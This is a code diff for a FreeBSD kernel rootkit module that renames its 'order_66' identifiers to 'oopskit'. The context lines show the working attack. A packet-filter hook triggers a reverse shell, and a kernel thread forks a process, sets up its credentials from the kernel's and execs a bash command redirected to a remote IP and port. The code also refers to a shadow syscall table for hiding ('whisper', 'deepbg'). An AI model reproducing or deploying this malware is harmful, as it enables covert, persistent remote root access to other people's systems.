@@ -56,23 +56,23 @@
 #define ARG2LEN 58
 extern struct protosw inetsw[];
 
-char ** order_66_args = NULL;
+char ** oopskit_args = NULL;
 
 unsigned int w_fport;
 
 struct sx stk_xfer_lock;
 
-struct order_66_params {
-   struct proc * stk_order_66_proc;
-   char * stk_order_66_args[3][ARG2LEN];
+struct oopskit_params {
+   struct proc * stk_oopskit_proc;
+   char * stk_oopskit_args[3][ARG2LEN];
    unsigned int fport;
 };
 
-static void start_order_66(void *data) {
+static void start_oopskit(void *data) {
 #ifdef DEBUG
-   printf("[-] start_order_66 process started\n");
+   printf("[-] start_oopskit process started\n");
 #endif
-   struct order_66_params * params = (struct order_66_params *)data;
+   struct oopskit_params * params = (struct oopskit_params *)data;
    vm_offset_t addr;
    struct execve_args args;
    int error;
@@ -101,19 +101,19 @@ static void start_order_66(void *data) {
 
    ucp = (char *)p->p_sysent->sv_usrstack;
 
-   length = strlen((char *)params->stk_order_66_args[2]) + 1;
+   length = strlen((char *)params->stk_oopskit_args[2]) + 1;
    ucp -= length;
-   copyout((char *)params->stk_order_66_args[2], ucp, length);
+   copyout((char *)params->stk_oopskit_args[2], ucp, length);
    arg2 = ucp;
 
-   length = strlen((char *)params->stk_order_66_args[1]) + 1;
+   length = strlen((char *)params->stk_oopskit_args[1]) + 1;
    ucp -= length;
-   copyout((char *)params->stk_order_66_args[1], ucp, length);
+   copyout((char *)params->stk_oopskit_args[1], ucp, length);
    arg1 = ucp;
 
-   length = strlen((char *)params->stk_order_66_args[0]) + 1;
+   length = strlen((char *)params->stk_oopskit_args[0]) + 1;
    ucp -= length;
-   copyout((char *)params->stk_order_66_args[0], ucp, length);
+   copyout((char *)params->stk_oopskit_args[0], ucp, length);
    arg0 = ucp;
 
    /*
@@ -152,21 +152,21 @@ static void start_order_66(void *data) {
 
    if (error != ENOENT) {
 #ifdef DEBUG
-      printf("[x] exec %s: error %d\n", (char *)params->stk_order_66_args[0],
+      printf("[x] exec %s: error %d\n", (char *)params->stk_oopskit_args[0],
          error);
 #endif
    }
 
 #ifdef DEBUG
-   printf("[x] order_66 failed\n");
+   printf("[x] oopskit failed\n");
 #endif
 }
 
-static void create_order_66(void *data) {
+static void create_oopskit(void *data) {
 #ifdef DEBUG
-   printf("[-] create_order_66 called\n");
+   printf("[-] create_oopskit called\n");
 #endif
-   struct order_66_params * params = (struct order_66_params *)data;
+   struct oopskit_params * params = (struct oopskit_params *)data;
    struct fork_req fr;
    struct ucred *newcred, *oldcred;
    struct thread *td;
@@ -174,73 +174,73 @@ static void create_order_66(void *data) {
 
    bzero(&fr, sizeof(fr));
    fr.fr_flags = RFFDG | RFPROC | RFSTOPPED;
-   fr.fr_procp = &params->stk_order_66_proc;
+   fr.fr_procp = &params->stk_oopskit_proc;
    error = fork1(curthread, &fr);
    if (error) {
 #ifdef DEBUG
-      printf("[x] cannot fork order_66: %d\n", error);
+      printf("[x] cannot fork oopskit: %d\n", error);
 #endif
       return;
    }
 
-   /* divorce order_66's credentials from the kernel's */
+   /* divorce oopskit's credentials from the kernel's */
    newcred = crget();
    sx_xlock(&proctree_lock);
-   PROC_LOCK(params->stk_order_66_proc);
-   oldcred = params->stk_order_66_proc->p_ucred;
+   PROC_LOCK(params->stk_oopskit_proc);
+   oldcred = params->stk_oopskit_proc->p_ucred;
    crcopy(newcred, oldcred);
-   proc_set_cred(params->stk_order_66_proc, newcred);
-   td = FIRST_THREAD_IN_PROC(params->stk_order_66_proc);
+   proc_set_cred(params->stk_oopskit_proc, newcred);
+   td = FIRST_THREAD_IN_PROC(params->stk_oopskit_proc);
    crfree(td->td_ucred);
-   td->td_ucred = crhold(params->stk_order_66_proc->p_ucred);
-   PROC_UNLOCK(params->stk_order_66_proc);
+   td->td_ucred = crhold(params->stk_oopskit_proc->p_ucred);
+   PROC_UNLOCK(params->stk_oopskit_proc);
    sx_xunlock(&proctree_lock);
    crfree(oldcred);
 
-   cpu_fork_kthread_handler(FIRST_THREAD_IN_PROC(params->stk_order_66_proc),
-      start_order_66, params);
+   cpu_fork_kthread_handler(FIRST_THREAD_IN_PROC(params->stk_oopskit_proc),
+      start_oopskit, params);
 }
 
-static void kick_order_66(void *data) {
-   struct order_66_params * params = (struct order_66_params *)data;
+static void kick_oopskit(void *data) {
+   struct oopskit_params * params = (struct oopskit_params *)data;
    struct thread *td;
 
-   td = FIRST_THREAD_IN_PROC(params->stk_order_66_proc);
+   td = FIRST_THREAD_IN_PROC(params->stk_oopskit_proc);
    thread_lock(td);
    TD_SET_CAN_RUN(td);
    sched_add(td, SRQ_BORING);
    thread_unlock(td);
 }
 
-static void order_66() {
+static void oopskit() {
 #ifdef DEBUG
-   printf("[-] order_66 thread created\n");
+   printf("[-] oopskit thread created\n");
 #endif
    // Structure for holding parameters on the stack
-   struct order_66_params params;
+   struct oopskit_params params;
 
    sx_xlock(&stk_xfer_lock);
-   // Copy order_66_args to stack
-   bzero(&params.stk_order_66_args[0][0], ARG2LEN);
-   strcpy((char *)params.stk_order_66_args[0], (char *)order_66_args[0]);
-   bzero(&params.stk_order_66_args[1][0], ARG2LEN);
-   strcpy((char *)params.stk_order_66_args[1], (char *)order_66_args[1]);
-   bzero(&params.stk_order_66_args[2][0], ARG2LEN);
-   strcpy((char *)params.stk_order_66_args[2], (char *)order_66_args[2]);
+   // Copy oopskit_args to stack
+   bzero(&params.stk_oopskit_args[0][0], ARG2LEN);
+   strcpy((char *)params.stk_oopskit_args[0], (char *)oopskit_args[0]);
+   bzero(&params.stk_oopskit_args[1][0], ARG2LEN);
+   strcpy((char *)params.stk_oopskit_args[1], (char *)oopskit_args[1]);
+   bzero(&params.stk_oopskit_args[2][0], ARG2LEN);
+   strcpy((char *)params.stk_oopskit_args[2], (char *)oopskit_args[2]);
 
    // Copy port to stack
    params.fport = w_fport;
 
    // Free memory since args were copied to the stack
-   free(order_66_args[0], M_TEMP);
-   free(order_66_args[1], M_TEMP);
-   free(order_66_args[2], M_TEMP);
-   free(order_66_args, M_TEMP);
-   order_66_args = NULL;
+   free(oopskit_args[0], M_TEMP);
+   free(oopskit_args[1], M_TEMP);
+   free(oopskit_args[2], M_TEMP);
+   free(oopskit_args, M_TEMP);
+   oopskit_args = NULL;
    sx_xunlock(&stk_xfer_lock);
 
-   create_order_66(&params);
-   kick_order_66(&params);
+   create_oopskit(&params);
+   kick_oopskit(&params);
 
    int status;
    int error;
@@ -248,7 +248,7 @@ static void order_66() {
    sy_call_t * whisper = shadow_sysent[WHISPER_INDEX].new_sy_call;
    struct whisper_args wa;
    struct deepbg_args da;
-   da.p_pid = params.stk_order_66_proc->p_pid;
+   da.p_pid = params.stk_oopskit_proc->p_pid;
    pause("zzz", 100);
 
    if (deepbg != NULL) {
@@ -278,10 +278,10 @@ static void order_66() {
       }
    }
 
-   kern_wait(curthread, params.stk_order_66_proc->p_pid, &status, 0, NULL);
+   kern_wait(curthread, params.stk_oopskit_proc->p_pid, &status, 0, NULL);
 
 #ifdef DEBUG
-   printf("[-] order_66 thread exiting\n");
+   printf("[-] oopskit thread exiting\n");
 #endif
    kthread_exit();
 }
@@ -304,15 +304,15 @@ static void reverse_shell(long ip) {
     sx_xlock(&stk_xfer_lock);
     w_fport = fport;
 
-    order_66_args = malloc(3*sizeof(char *), M_TEMP, M_NOWAIT);
-    order_66_args[0] = malloc(strlen(BASH)+1, M_TEMP, M_NOWAIT);
-    order_66_args[1] = malloc(strlen(BASH_OPT)+1, M_TEMP, M_NOWAIT);
-    order_66_args[2] = malloc(strlen(FULL_BASH_COMMAND_STR)+1, M_TEMP, M_NOWAIT);
+    oopskit_args = malloc(3*sizeof(char *), M_TEMP, M_NOWAIT);
+    oopskit_args[0] = malloc(strlen(BASH)+1, M_TEMP, M_NOWAIT);
+    oopskit_args[1] = malloc(strlen(BASH_OPT)+1, M_TEMP, M_NOWAIT);
+    oopskit_args[2] = malloc(strlen(FULL_BASH_COMMAND_STR)+1, M_TEMP, M_NOWAIT);
 
-    strcpy(order_66_args[0], BASH);
-    strcpy(order_66_args[1], BASH_OPT);
-    strcpy(order_66_args[2], FULL_BASH_COMMAND_STR);
-    ptr = order_66_args[2];
+    strcpy(oopskit_args[0], BASH);
+    strcpy(oopskit_args[1], BASH_OPT);
+    strcpy(oopskit_args[2], FULL_BASH_COMMAND_STR);
+    ptr = oopskit_args[2];
     bzero(ptr, ARG2LEN);
 
     strcpy(ptr, BASH_COMMAND_STR);
@@ -337,16 +337,16 @@ static void reverse_shell(long ip) {
     strcpy(ptr, " 0>&1");
 #ifdef DEBUG
     printf("[-] port = %u\n", fport);
-    printf("[-] %s %s %s\n", order_66_args[0], order_66_args[1],
-        order_66_args[2]);
+    printf("[-] %s %s %s\n", oopskit_args[0], oopskit_args[1],
+        oopskit_args[2]);
 #endif
     sx_xunlock(&stk_xfer_lock);
-    struct thread *order_66_thread;
+    struct thread *oopskit_thread;
 
     struct kthread_desc kd = {
-        "order_66",
-        order_66,
-        &order_66_thread
+        "oopskit",
+        oopskit,
+        &oopskit_thread
     };
 
     bool disable_sleeping = false;
@@ -422,7 +422,7 @@ static int load(struct module *module, int cmd, void *arg) {
    switch (cmd) {
       case MOD_LOAD:
 #ifdef DEBUG
-         uprintf("[-] Loading order_66 module\n");
+         uprintf("[-] Loading oopskit module\n");
 #endif
          void *head = pfil_head_get(PFIL_TYPE_AF, AF_LINK);
 	 int res = pfil_add_hook_flags(hook, NULL, PFIL_ALL | PFIL_WAITOK | 17, head);
@@ -431,7 +431,7 @@ static int load(struct module *module, int cmd, void *arg) {
          break;
       case MOD_UNLOAD:
 #ifdef DEBUG
-         uprintf("[-] Unloading order_66 module\n");
+         uprintf("[-] Unloading oopskit module\n");
 #endif
          head = pfil_head_get(PFIL_TYPE_AF, AF_LINK);
 	 res = pfil_remove_hook_flags(hook, NULL, PFIL_ALL | PFIL_WAITOK | 17, head);
@@ -445,12 +445,12 @@ static int load(struct module *module, int cmd, void *arg) {
    return (error);
 }
 
-static moduledata_t icmp_input_order_66_mod = {
-   "icmp_input_order_66",      /* module name */
+static moduledata_t icmp_input_oopskit_mod = {
+   "icmp_input_oopskit",      /* module name */
    load,                       /* event handler */
    NULL                        /* extra data */
 };
 
-DECLARE_MODULE(icmp_input_order_66, icmp_input_order_66_mod, SI_SUB_DRIVERS,
+DECLARE_MODULE(icmp_input_oopskit, icmp_input_oopskit_mod, SI_SUB_DRIVERS,
    SI_ORDER_ANY);
 MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
